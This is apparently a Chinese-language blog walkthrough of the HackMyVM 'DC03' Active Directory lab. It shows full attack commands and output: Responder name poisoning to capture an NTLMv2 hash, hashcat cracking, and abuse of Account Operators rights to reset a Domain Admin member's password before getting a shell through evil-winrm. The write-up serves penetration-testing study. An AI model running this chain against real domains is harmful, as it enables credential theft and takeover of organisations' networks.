{"pageProps":{"postData":{"id":"HackMyVMDC03","contentHtml":"<h1>DC03.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=DC03\">https://hackmyvm.eu/machines/machine.php?vm=DC03</a></p>\n</blockquote>\n<p>Notes: <strong>Something realistic i think. U tell me.</strong></p>\n<h2>前期踩点</h2>\n<p><code>nmap</code>扫描，<code>126</code>是靶机</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  nmap -sP 192.168.56.0/24    \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 01:51 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00044s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00026s latency).\nMAC Address: 08:00:27:C9:BF:B4 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> SOUPEDECODE.LOCAL (192.168.56.126)\nHost is up (0.00040s latency).\nMAC Address: 08:00:27:21:0C:DA (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.4\nHost is up.\nNmap <span class=\"hljs-keyword\">done</span>: 256 IP addresses (4 hosts up) scanned <span class=\"hljs-keyword\">in</span> 28.00 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  nmap -sT -min-rate 10000 -p- 192.168.56.126            \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 01:52 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> SOUPEDECODE.LOCAL (192.168.56.126)\nHost is up (0.00099s latency).\nNot shown: 65518 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\nMAC Address: 08:00:27:21:0C:DA (Oracle VirtualBox virtual NIC)\n</code></pre>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  nmap -sT -A -T4 -O -p 445,389 192.168.56.126\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 01:53 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> SOUPEDECODE.LOCAL (192.168.56.126)\nHost is up (0.00084s latency).\n\nPORT    STATE SERVICE       VERSION\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)                           \n445/tcp open  microsoft-ds?\nMAC Address: 08:00:27:21:0C:DA (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2022|11|2016 (97%)\nOS CPE: cpe:/o:microsoft:windows_server_2016\nAggressive OS guesses: Microsoft Windows Server 2022 (97%), Microsoft Windows 11 21H2 (91%), Microsoft Windows Server 2016 (91%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (<span class=\"hljs-built_in\">test</span> conditions non-ideal).\nNetwork Distance: 1 hop\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   <span class=\"hljs-built_in\">date</span>: 2025-02-15T21:53:39\n|_  start_date: N/A\n|_nbstat: NetBIOS name: DC01, NetBIOS user: &#x3C;unknown>, NetBIOS MAC: 08:00:27:21:0c:da (Oracle VirtualBox virtual NIC)\n|_clock-skew: 14h59m58s\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.84 ms SOUPEDECODE.LOCAL (192.168.56.126)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 51.08 seconds\n</code></pre>\n<p>没有<code>http</code>服务，得到域名添加到<code>hosts</code>文件</p>\n<h2>SMB - 1</h2>\n<p>先看<code>SMB</code>是否可以使用匿名帐户登录</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  smbclient -L 192.168.56.126 -U soupedecode.local/anonymous\nPassword <span class=\"hljs-keyword\">for</span> [SOUPEDECODE.LOCAL\\anonymous]:\nsession setup failed: NT_STATUS_LOGON_FAILURE\n</code></pre>\n<h2>域用户枚举 （兔子洞）</h2>\n<p>没有什么信息，进行域用户枚举，使用<code>kerbrute</code></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/Tools  ./kerbrute_linux_amd64 userenum --dc 192.168.56.126 -d SOUPEDECODE.LOCAL ~/Desktop/Dict/SecLists-2024.3/Usernames/xato-net-10-million-usernames.txt          \n\n    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,&#x3C; /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: dev () - 02/15/25 - Ronnie Flathers @ropnop\n\n2025/02/15 02:56:18 >  Using KDC(s):\n2025/02/15 02:56:18 >   192.168.56.126:88\n\n2025/02/15 02:56:18 >  [+] VALID USERNAME:       charlie@SOUPEDECODE.LOCAL\n2025/02/15 02:56:18 >  [+] VALID USERNAME:       Charlie@SOUPEDECODE.LOCAL\n2025/02/15 02:56:18 >  [+] VALID USERNAME:       administrator@SOUPEDECODE.LOCAL\n2025/02/15 02:56:20 >  [+] VALID USERNAME:       Administrator@SOUPEDECODE.LOCAL\n2025/02/15 02:56:21 >  [+] VALID USERNAME:       CHARLIE@SOUPEDECODE.LOCAL\n2025/02/15 02:58:52 >  [+] VALID USERNAME:       wreed11@SOUPEDECODE.LOCAL\n2025/02/15 03:04:20 >  [+] VALID USERNAME:       printserver@SOUPEDECODE.LOCAL\n2025/02/15 03:09:29 >  [+] VALID USERNAME:       kleo2@SOUPEDECODE.LOCAL\n2025/02/15 03:15:20 >  [+] VALID USERNAME:       dc01@SOUPEDECODE.LOCAL\n</code></pre>\n<p>将用户名保存到<code>user.txt</code>，使用<code>crackmapexec</code> 找是否存在弱密码用户，没有存在</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/DC03  crackmapexec smb 192.168.56.126 -u user.txt -p user.txt --continue-on-success --no-bruteforce\nSMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)\nSMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\\charlie:charlie STATUS_LOGON_FAILURE \nSMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\\Charlie:Charlie STATUS_LOGON_FAILURE \nSMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\\administrator:administrator STATUS_LOGON_FAILURE \nSMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\\Administrator:Administrator STATUS_LOGON_FAILURE \nSMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\\CHARLIE:CHARLIE STATUS_LOGON_FAILURE \nSMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\\wreed11:wreed11 STATUS_LOGON_FAILURE \nSMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\\printserver:printserver STATUS_LOGON_FAILURE \nSMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\\kleo2:kleo2 STATUS_LOGON_FAILURE \nSMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\\dc01:dc01 STATUS_LOGON_FAILURE \n</code></pre>\n<h2>Responder</h2>\n<p>再<code>Kali</code>上抓包，看见存在靶机在发送<code>MDNS</code>请求</p>\n<p><code>192.168.56.126</code> 正在发送 <code>mDNS</code> 查询，例如 <code>A FileServer.local</code>，这表明该设备正在尝试解析 <code>.local</code> 域名</p>\n<p><img src=\"/post-images/HackMyVMDC03/image103.png\" alt=\"image.png\"></p>\n<p>使用<code>Responder</code>来毒害 <code>responder -I eth1 -wd</code></p>\n<pre><code class=\"hljs language-bash\"> root@kali  ~/Desktop/test/DC03  responder -I eth1 -wd                                   \n                                         __                                                     \n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.                                        \n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|                                        \n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                                          \n                   |__|                         \n                                                                                                                                                                                                           NBT-NS, LLMNR &#x26; MDNS Responder 3.1.5.0                                                                                                                                                                                                                                                                                                                                                 To support this project:                                                                                                                                                                      \n  Github -> https://github.com/sponsors/lgandx  \n  Paypal  -> https://paypal.me/PythonResponder\n  ....\n  [+] Listening <span class=\"hljs-keyword\">for</span> events...                                                                                                                                                                     \n                                                                                                                                                                                                \n[*] [NBT-NS] Poisoned answer sent to 192.168.56.126 <span class=\"hljs-keyword\">for</span> name FILESERVER (service: File Server)                                                                                                  \n[*] [LLMNR]  Poisoned answer sent to 192.168.56.126 <span class=\"hljs-keyword\">for</span> name FileServer                                                                                                                         \n[*] [MDNS] Poisoned answer sent to 192.168.56.126  <span class=\"hljs-keyword\">for</span> name FileServer.<span class=\"hljs-built_in\">local</span>                                                                                                                    \n[*] [MDNS] Poisoned answer sent to fe80::dd4d:c480:d553:6413 <span class=\"hljs-keyword\">for</span> name FileServer.<span class=\"hljs-built_in\">local</span>          \n[*] [LLMNR]  Poisoned answer sent to fe80::dd4d:c480:d553:6413 <span class=\"hljs-keyword\">for</span> name FileServer              \n[*] [MDNS] Poisoned answer sent to 192.168.56.126  <span class=\"hljs-keyword\">for</span> name FileServer.<span class=\"hljs-built_in\">local</span>                    \n[*] [LLMNR]  Poisoned answer sent to 192.168.56.126 <span class=\"hljs-keyword\">for</span> name FileServer                         \n[*] [MDNS] Poisoned answer sent to fe80::dd4d:c480:d553:6413 <span class=\"hljs-keyword\">for</span> name FileServer.<span class=\"hljs-built_in\">local</span>          \n[*] [LLMNR]  Poisoned answer sent to fe80::dd4d:c480:d553:6413 <span class=\"hljs-keyword\">for</span> name FileServer              \n[SMB] NTLMv2-SSP Client   : fe80::dd4d:c480:d553:6413                                           \n[SMB] NTLMv2-SSP Username : soupedecode\\xkate578\n[SMB] NTLMv2-SSP Hash     : xkate578::soupedecode:ca95e6d0aa430cn</code></pre>\n<p>可以看到靶机一直在请求<code>FileServer</code> 的域名，<code>Responder</code>响应了靶机的请求，使其将 <code>FILESERVER</code> 名称解析到攻击者的 <code>IP</code> 地址，并且抓到呢<code>xkate578</code>用户的<code>net NTLM hash</code></p>\n<p>使用<code>hashcat</code>来爆破捕获到的<code>NTLMv2-SSP Hash</code></p>\n<pre><code class=\"hljs language-bash\"> ⚡ root@kali  ~/Desktop/test/DC03  hashcat -h | grep NTLM            \n   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol         \n  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol         \n   5600 | NetNTLMv2                                                  | Network Protocol         \n  27100 | NetNTLMv2 (NT)                                             | Network Protocol\n   1000 | NTLM                                                       | Operating System         \n ⚡ root@kali  ~/Desktop/test/DC03  hashcat -m 5600 <span class=\"hljs-string\">'&#x3C; NTLMv2-SSP Hash >'</span> /usr/share/wordlists/rockyou.txt                    \n</code></pre>\n<p><img src=\"/post-images/HackMyVMDC03/image104.png\" alt=\"image.png\"></p>\n<p>得到一对账号<code>xkate578:jesuschrist</code></p>\n<h2>SMB - 2</h2>\n<p>获得账号密码后再去<code>SMB</code> 服务获取信息</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/DC03  smbclient -L 192.168.56.126 -U SOUPEDECODE.LOCAL/xkate578%jesuschrist    \n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        share           Disk      \n        SYSVOL          Disk      Logon server share \nReconnecting with SMB1 <span class=\"hljs-keyword\">for</span> workgroup listing.\ndo_connect: Connection to 192.168.56.126 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n</code></pre>\n<p>在<code>share</code>文件夹下发现<code>UserFlag</code></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/DC03  smbclient //192.168.56.126/share -U SOUPEDECODE.LOCAL/xkate578%jesuschrist\nTry <span class=\"hljs-string\">\"help\"</span> to get a list of possible commands.\nsmb: \\> <span class=\"hljs-built_in\">ls</span>\n  .                                  DR        0  Thu Aug  1 02:06:14 2024\n  ..                                  D        0  Thu Aug  1 01:38:08 2024\n  desktop.ini                       AHS      282  Thu Aug  1 01:38:08 2024\n  user.txt                            A       70  Thu Aug  1 01:39:25 2024\n\n                12942591 blocks of size 4096. 10929469 blocks available\n</code></pre>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/DC03  <span class=\"hljs-built_in\">cat</span> user.txt                                                                                 \n12f54a96f64443246930da001cafda8b\n</code></pre>\n<p>然后经过一系列的尝试，比如<code>Kerberoasting</code>和<code>ASP_REQ Roasting</code> ,还有<code>evil-winrm</code> 都已失败告终</p>\n<h2>查看用户信息</h2>\n<blockquote>\n<p>工具 ： <a href=\"https://github.com/the-useless-one/pywerview\">https://github.com/the-useless-one/pywerview</a></p>\n</blockquote>\n<p>查看用户信息</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/Tools/pywerview  pywerview get-netuser -w soupedecode.local --dc-ip 192.168.56.126 -u xkate578 -p jesuschrist --username xkate578\nobjectclass:           top, person, organizationalPerson, user\ncn:                    Xenia Kate                                                               \nsn:                    Kate                                                                     \nl:                     Springfield                                                              \nst:                    NY                                                                       \ntitle:                 Analyst                                                                  \ndescription:           Adventure seeker and extreme sports fan\npostalcode:            81335                \ntelephonenumber:       719-5053                                                                 \ngivenname:             Xenia \ninitials:              XK            \ndistinguishedname:     CN=Xenia Kate,CN=Users,DC=SOUPEDECODE,DC=LOCAL\ninstancetype:          4                                                                        \nwhencreated:           2024-06-15 20:04:39+00:00                                                \nwhenchanged:           2025-02-16 00:32:01+00:00                                                \ndisplayname:           Xenia Kate\nusncreated:            16902                                                                    \nmemberof:              CN=Account Operators,CN=Builtin,DC=SOUPEDECODE,DC=LOCAL\nusnchanged:            45086                                                                    \ndepartment:            Sales                                                                    \ncompany:               CompanyC                                                                 \nstreetaddress:         123 Elm St\nname:                  Xenia Kate                                                               \nobjectguid:            {f5dee86d-8f4e-4591-8446-0250d6e4bf92}                                   \nuseraccountcontrol:    NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD\nbadpwdcount:           0  \ncodepage:              0             \ncountrycode:           0         \nbadpasswordtime:       1601-01-01 00:00:00+00:00                                    \nlastlogoff:            1601-01-01 00:00:00+00:00                                                \nlastlogon:             2025-02-16 00:32:01.361403+00:00                                                                                                                                         \nlogonhours:            ffffffffffffffffffffffffffffffffffffffffff...\npwdlastset:            2024-08-01 05:37:18.874022+00:00  \nprimarygroupid:        513                      \nobjectsid:             S-1-5-21-2986980474-46765180-2505414164-1182                                                                                                                             \nadmincount:            1       \naccountexpires:        1601-01-01 00:00:00+00:00 \nlogoncount:            6                                                                        \nsamaccountname:        xkate578                                                                                                                                                                 \nsamaccounttype:        805306368                                                                \nuserprincipalname:     xkate578@soupedecode.local                                               \nobjectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL             \ndscorepropagationdata: 2024-08-01 05:47:50+00:00, 1601-01-01 00:00:00+00:00                     \nlastlogontimestamp:    2025-02-16 00:32:01.361403+00:00                                         \nmail:                  xkate578@soupedecode.local                               \n</code></pre>\n<p>从<code>memberof: CN=Account Operators,CN=Builtin,DC=SOUPEDECODE,DC=LOCAL</code> 中可以看到用户属于<code>Account Operators</code> 组</p>\n<h2>提权</h2>\n<p>我们是<code>Account Operators</code> 组的成员，拥有<strong>向用户授予有限的帐户创建权限</strong></p>\n<p>可以修改大多数类型的账户，可以管理本地用户和组，但不具备修改管理员组或全局组成员身份的权限</p>\n<p>现在是要寻找</p>\n<p>列出管理组的成员，可以看到成员包括一个组<code>Operators</code> 和<code>administrator</code> 用户</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/Tools/pywerview  pywerview get-netgroupmember -w soupedecode.local --dc-ip 192.168.56.126 -u xkate578 -p jesuschrist --group <span class=\"hljs-string\">\"Domain Admins\"</span>\ngroupdomain:  SOUPEDECODE.LOCAL\ngroupname:    Domain Admins\nmembername:   Operators\nmemberdomain: SOUPEDECODE.LOCAL\nisgroup:      True\nmemberdn:     CN=Operators,CN=Users,DC=SOUPEDECODE,DC=LOCAL\nobjectsid:    S-1-5-21-2986980474-46765180-2505414164-2165 \n\ngroupdomain:  SOUPEDECODE.LOCAL\ngroupname:    Domain Admins\nmembername:   Administrator\nmemberdomain: SOUPEDECODE.LOCAL\nisgroup:      False\nmemberdn:     CN=Administrator,CN=Users,DC=SOUPEDECODE,DC=LOCAL\nobjectsid:    S-1-5-21-2986980474-46765180-2505414164-500 \n</code></pre>\n<p>跟进<code>Operators</code> ，能发现存在 <code>fbeth103</code> 。</p>\n<p>然后<code>fbeth103</code> 属于<code>Operators</code> 组，而<code>Operators</code> 又属于<code>Domain Admins</code>组，那么<code>fbeth103</code> 就拥有<code>Domain Admins</code>组的权限。</p>\n<p><code>Account Operators</code> 组能够修改 <code>fbeth103</code> 用户的账户信息，即使 <code>fbeth103</code> 属于 <code>Operators</code> 组，而 <code>Operators</code> 组又是 <code>Domain Admins</code> 组的成员</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/Tools/pywerview  pywerview get-netgroupmember -w soupedecode.local --dc-ip 192.168.56.126 -u xkate578 -p jesuschrist --group <span class=\"hljs-string\">\"Operators\"</span>    \ngroupdomain:  SOUPEDECODE.LOCAL\ngroupname:    Operators\nmembername:   fbeth103\nmemberdomain: SOUPEDECODE.LOCAL\nisgroup:      False\nmemberdn:     CN=Fanny Beth,CN=Users,DC=SOUPEDECODE,DC=LOCAL\nobjectsid:    S-1-5-21-2986980474-46765180-2505414164-1221\n</code></pre>\n<p>修改<code>fbeth103</code> 的密码（第一次没成功，重新导入后才成功）</p>\n<p>通过<code>imparket</code>工具包的<code>changepasswd</code></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/DC03/output  changepasswd.py <span class=\"hljs-string\">'SOUPEDECODE.LOCAL/fbeth103@192.168.56.126'</span> -altuser <span class=\"hljs-string\">'xkate578'</span> -altpass <span class=\"hljs-string\">'jesuschrist'</span> -newpass <span class=\"hljs-string\">'hacked!'</span> -no-pass -reset\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Setting the password of SOUPEDECODE.LOCAL\\fbeth103 as SOUPEDECODE.LOCAL\\xkate578\n[*] Connecting to DCE/RPC as SOUPEDECODE.LOCAL\\xkate578\n[*] Password was changed successfully.\n[!] User no longer has valid AES keys <span class=\"hljs-keyword\">for</span> Kerberos, <span class=\"hljs-keyword\">until</span> they change their password again.\n\n</code></pre>\n<pre><code class=\"hljs language-bash\"> root@kali  ~/Desktop/test/DC03/output  evil-winrm -i 192.168.56.126 -u fbeth103 -p hacked!\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class=\"hljs-keyword\">function</span> is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop> <span class=\"hljs-built_in\">type</span> root.txt\nb8e59a7d4020792c412da75e589ff4fc\n</code></pre>\n<p>还可以使用<code>rpcclient</code>来修改密码</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/DC03/output  rpcclient -U SOUPEDDECODE.LOCAL/xkate578%jesuschrist 192.168.56.126\nrpcclient $> setuserinfo2 fbeth103 23 213121231\nrpcclient $> <span class=\"hljs-built_in\">exit</span>\n⚡ root@kali  ~/Desktop/test/DC03/output  evil-winrm -i 192.168.56.126 -u fbeth103 -p 213121231\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class=\"hljs-keyword\">function</span> is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\fbeth103\\Documents>                                                                      \n</code></pre>","title":"HackMyVM - DC03","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机","description":"DC03.\n\n https://hackmyvm.eu/machines/machine.php?vm=DC03\n \n\nNotes: Something realistic i think. U tell me.\n\n前期踩点\n\n`nmap`扫描，`126`是靶机\n\n\n\n\n\n\n\n没有`http`服务，得到域名添加到`hosts`文件\n\nSMB - 1\n\n先看`SMB`是否可以使用匿名帐户登录\n\n\n\n..."},"recentPosts":[{"id":"TheHackersLabsCuriosity2","title":"TheHackersLabs - Curiosity2","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsCuriosity","title":"TheHackersLabs - Curiosity","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsB I G","title":"TheHackersLabs - B.I.G","date":"2025-07-18","isEncrypted":false,"year":"2025","month":"07","day":"18"},{"id":"TheHackersLabsBlackGold","title":"TheHackersLabs - BlackGold","date":"2025-07-15","isEncrypted":false,"year":"2025","month":"07","day":"15"},{"id":"TheHackersLabsSedition","title":"TheHackersLabs - Sedition","date":"2025-07-14","isEncrypted":false,"year":"2025","month":"07","day":"14"},{"id":"HackMyVMXimai","title":"HackMyVM - Ximai","date":"2025-07-14","isEncrypted":false,"year":"2025","month":"07","day":"14"},{"id":"HackTheBoxSeason8 - Outbound","title":"HackTheBox - Season8 - Outbound","date":"2025-07-13","isEncrypted":true,"year":"2025","month":"07","day":"13"}]},"__N_SSG":true}